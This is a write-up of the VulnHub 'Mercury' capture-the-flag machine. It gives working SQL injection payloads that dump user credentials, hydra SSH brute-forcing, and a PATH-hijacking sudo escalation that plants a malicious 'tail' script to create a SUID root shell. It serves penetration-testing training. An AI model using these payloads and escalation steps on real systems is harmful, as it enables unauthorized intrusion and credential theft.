# Mercury VulnHub Challenge Writeup

## Overview

Mercury is a VulnHub machine that involves exploiting a SQL injection vulnerability in a Django web application to extract credentials, followed by a path-hijacking privilege escalation to gain root access.

## Reconnaissance

### Network Scanning

I started by identifying the target machine on the network using `netdiscover`:

```shellscript
netdiscover -r 192.168.1.0/24
```

The target was found at `192.168.1.20`.

Next, I performed a comprehensive port scan using `nmap` to identify open services and their versions:

```shellscript
nmap -sS -sV -Pn --min-rate=1000 --max-retries=2 192.168.1.20 -p-
```

The scan revealed the following open ports:

- **22/tcp**: `OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)`
- **8080/tcp**: `http WSGIServer 0.2 (Python 3.8.2)`


### Web Enumeration

The web server running on port 8080 indicated a Python WSGIServer. I used `gobuster` and `ffuf` to enumerate directories and files:

```shellscript
gobuster dir -u http://192.168.1.20:8080/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

This identified `/robots.txt`.

```shellscript
ffuf -u 'http://192.168.1.20:8080/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

This also showed various content from the wordlist, but no new directories.

I then specifically checked `/robots.txt`:

```shellscript
curl http://192.168.1.20:8080/robots.txt
```

The output was a Django 404 page, which is useful as it reveals the Django version and URL patterns. The page indicated:

- `Django Version: 3.1`
- URL patterns: `[name='index']`, `robots.txt [name='robots']`, `mercuryfacts/`


I then accessed the `/mercuryfacts/` endpoint:

```shellscript
curl http://192.168.1.20:8080/mercuryfacts/
```

This page showed:

```html
<html><head><title> Mercury Facts </title></head><body><img src="/static/mercury_facts/mercury_1.jpg" alt="Picture of Mercury" width="400" height="400"><br />Still in development.<ul>        <li> Mercury Facts: <a href='/mercuryfacts/1'> Load a fact. </a> </li>        <li> Website Todo List: <a href='/mercuryfacts/todo'> See list. </a> </li></ul></body></html>
```

This indicated a "Mercury Facts" section with a link to `/mercuryfacts/1`. Accessing this URL showed:

```shellscript
curl http://192.168.1.20:8080/mercuryfacts/1/
```

Output: `Fact id: 1. (('Mercury does not have any moons or rings.',),)`

This `mercuryfacts/` endpoint, taking a numerical ID, was a prime candidate for SQL injection.

## Initial Foothold (SQL Injection & SSH)

### SQL Injection

I tested the `/mercuryfacts/` endpoint for SQL injection by appending a non-numeric string, which resulted in a Django `OperationalError` revealing the underlying SQL query:

```shellscript
curl http://192.168.1.20:8080/mercuryfacts/sdfqsdf/
```

The error message included: `(1054, "Unknown column 'sdfqsdf' in 'where clause'")` and the query: `SELECT fact FROM facts WHERE id = sdfqsdf`. This confirmed a SQL injection vulnerability.

I then used `sqlmap` to automate the process, though it initially struggled with the URI injection. Manual testing with `curl` proved more effective.

First, I confirmed the injection with a simple `OR 1=1`:

```shellscript
curl "http://192.168.1.20:8080/mercuryfacts/1%20OR%201%3D1/"
```

Output: `Fact id: 1 OR 1=1. (('Mercury does not have any moons or rings.',), ('Mercury is the smallest planet.',), ...)`
This successfully returned all facts, confirming the injection.

Next, I used a `UNION SELECT` to enumerate tables from `information_schema.tables`:

```shellscript
curl "http://192.168.1.20:8080/mercuryfacts/1%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20/"
```

This returned a list of tables, including `facts` and `users`.

Then, I enumerated columns from the `users` table:

```shellscript
curl "http://192.168.1.20:8080/mercuryfacts/1%20UNION%20SELECT%20column_name%20FROM%20information_schema.columns%20WHERE%20table_name%3D'users'--%20/"
```

Output: `Fact id: 1 UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'-- . (('Mercury does not have any moons or rings.',), ('id',), ('password',), ('username',))`
This revealed `id`, `password`, and `username` columns in the `users` table.

Finally, I extracted the usernames and passwords using `CONCAT`:

```shellscript
curl "http://192.168.1.20:8080/mercuryfacts/1%20UNION%20SELECT%20CONCAT(username,%20':',%20password)%20FROM%20users--%20/"
```

Output: `Fact id: 1 UNION SELECT CONCAT(username, ':', password) FROM users-- . (('Mercury does not have any moons or rings.',), ('john:johnny1987',), ('laura:lovemykids111',), ('sam:lovemybeer111',), ('webmaster:mercuryisthesizeof0.056Earths',))`

The following credentials were found:

- `john:johnny1987`
- `laura:lovemykids111`
- `sam:lovemybeer111`
- `webmaster:mercuryisthesizeof0.056Earths`


### SSH Access

I saved the extracted usernames and passwords to `users.txt` and `passwords.txt` respectively:

```shellscript
cat << 'EOF' > users.txt
john
laura
sam
webmaster
EOF

cat << 'EOF' > passwords.txt
johnny1987
lovemykids111
lovemybeer111
mercuryisthesizeof0.056Earths
EOF
```

I then used `hydra` to attempt SSH login with these credentials:

```shellscript
hydra -L users.txt -P passwords.txt 192.168.1.20 -s 22 ssh
```

`hydra` successfully found the credentials for `webmaster`:
`host: 192.168.1.20 login: webmaster password: mercuryisthesizeof0.056Earths`

I then logged in via SSH as `webmaster`:

```shellscript
ssh webmaster@192.168.1.20
```

Password: `mercuryisthesizeof0.056Earths`

I successfully gained an initial shell as the `webmaster` user.

## Privilege Escalation

### Initial Enumeration as `webmaster`

Upon gaining the shell, I listed the contents of the home directory:

```shellscript
webmaster@mercury:~$ ls
mercury_proj  user_flag.txt
```

I found `user_flag.txt`:

```shellscript
webmaster@mercury:~$ cat user_flag.txt
[user_flag_8339915c9a454657bd60ee58776f4ccd]
```

I navigated into the `mercury_proj` directory:

```shellscript
webmaster@mercury:~/mercury_proj$ ls
db.sqlite3  manage.py  mercury_facts  mercury_index  mercury_proj  notes.txt
```

Inside `mercury_proj`, I found `notes.txt`:

```shellscript
webmaster@mercury:~/mercury_proj$ cat notes.txt
Project accounts (both restricted):
webmaster for web stuff - webmaster:bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK
linuxmaster for linux stuff - linuxmaster:bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==
```

These appeared to be base64 encoded passwords. I decoded them:

```shellscript
webmaster@mercury:~/mercury_proj$ echo "bWVyY3VyeWlzdGhlc2l6ZW9mMC4wNTZFYXJ0aHMK" | base64 -d
mercuryisthesizeof0.056Earths
webmaster@mercury:~/mercury_proj$ echo "bWVyY3VyeW1lYW5kaWFtZXRlcmlzNDg4MGttCg==" | base64 -d
mercurymeandiameteris4880km
```

So, the credentials were:

- `webmaster:mercuryisthesizeof0.056Earths` (already known)
- `linuxmaster:mercurymeandiameteris4880km`


I attempted to switch user to `linuxmaster`:

```shellscript
webmaster@mercury:~/mercury_proj$ su linuxmaster
Password: mercurymeandiameteris4880km
```

This was successful, and I gained a shell as `linuxmaster`.

### Sudo Rights and Path Hijacking

As `linuxmaster`, I checked for `sudo` privileges:

```shellscript
linuxmaster@mercury:~$ sudo -l
```

Output:

```plaintext
User linuxmaster may run the following commands on mercury:
    (root : root) SETENV: /usr/bin/check_syslog.sh
```

This showed that `linuxmaster` could run `/usr/bin/check_syslog.sh` as root, and importantly, with `SETENV`, meaning environment variables like `PATH` could be preserved or set.

I inspected the `check_syslog.sh` script:

```shellscript
linuxmaster@mercury:~$ cat /usr/bin/check_syslog.sh
#!/bin/bash
tail -n 10 /var/log/syslog
```

The script simply executes `tail` without a full path (`/usr/bin/tail`). This is a classic path hijacking vulnerability. If I can place an executable named `tail` in a directory that appears earlier in the `PATH` environment variable than `/usr/bin`, my malicious `tail` will be executed instead of the legitimate one when `check_syslog.sh` is run with `sudo`.

I checked the current `PATH` for `linuxmaster`:

```shellscript
linuxmaster@mercury:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

My home directory `/home/linuxmaster` is not in the `PATH`. I need to add it to the beginning of the `PATH` variable.

I created a malicious `tail` script in `/home/linuxmaster`:

```shellscript
cat << 'EOF' > tail
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```

This script will copy `/bin/bash` to `/tmp/rootbash` and set the SUID bit (4755) on it, allowing it to be executed with root privileges.

I made the script executable:

```shellscript
linuxmaster@mercury:~$ chmod +x tail
```

Now, I executed `check_syslog.sh` using `sudo`, ensuring my modified `PATH` is used:

```shellscript
linuxmaster@mercury:~$ sudo PATH=/home/linuxmaster:$PATH /usr/bin/check_syslog.sh
```

This command tells `sudo` to execute `/usr/bin/check_syslog.sh` while setting the `PATH` environment variable to include `/home/linuxmaster` at the beginning. When `check_syslog.sh` runs `tail`, it will find and execute my malicious `tail` script first.

After running the command, I verified that `/tmp/rootbash` was created and had the SUID bit set:

```shellscript
linuxmaster@mercury:~$ ls -la /tmp/rootbash
-rwsr-xr-x  1 root root 1183448 Jul 15 11:23 rootbash
```

The `s` in `-rwsr-xr-x` confirms the SUID bit is set.

Finally, I executed the SUID binary to get a root shell:

```shellscript
linuxmaster@mercury:~$ /tmp/rootbash -p
```

The `-p` flag ensures that the effective UID is preserved, giving me a root shell.

```shellscript
rootbash-5.0# id
uid=1002(linuxmaster) gid=1002(linuxmaster) euid=0(root) groups=1002(linuxmaster),1003(viewsyslog)
```

The `euid=0(root)` confirms successful root privilege escalation.

## Root Flag

With root privileges, I navigated to the `/root` directory to retrieve the final flag:

```shellscript
rootbash-5.0# cd /root
rootbash-5.0# ls
root_flag.txt
rootbash-5.0# cat root_flag.txt
```

The content of `root_flag.txt` was:

```plaintext
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
/##////////@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(((/(*(/((((((////////&@@@@@@@@@@@@@@@@@@@@@@@@((#(#(###((##//(((/(/(((*((//@@@@@@@@@@@@@@@@@@@@@@@@@(((###((#(#(((/((///*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%#(#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Congratulations on completing Mercury!!!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_69426d9fda579afbffd9c2d47ca31d90]
```

## Conclusion

The Mercury challenge was a great exercise in web application and Linux privilege escalation. The initial foothold was gained by identifying and exploiting a SQL injection vulnerability in a Django application to extract user credentials. This led to an SSH shell as `webmaster`. Further enumeration revealed another user `linuxmaster` and a `sudo` misconfiguration allowing `linuxmaster` to run a script as root. This script was vulnerable to path hijacking, which was exploited to create a SUID root shell, ultimately leading to full root access.

## Tools Used

- `netdiscover`
- `nmap`
- `gobuster`
- `ffuf`
- `curl`
- `sqlmap` (though manual `curl` was more effective for the specific SQLi)
- `hydra`
- `ssh`
- `base64`
- `chmod`
- `cp`
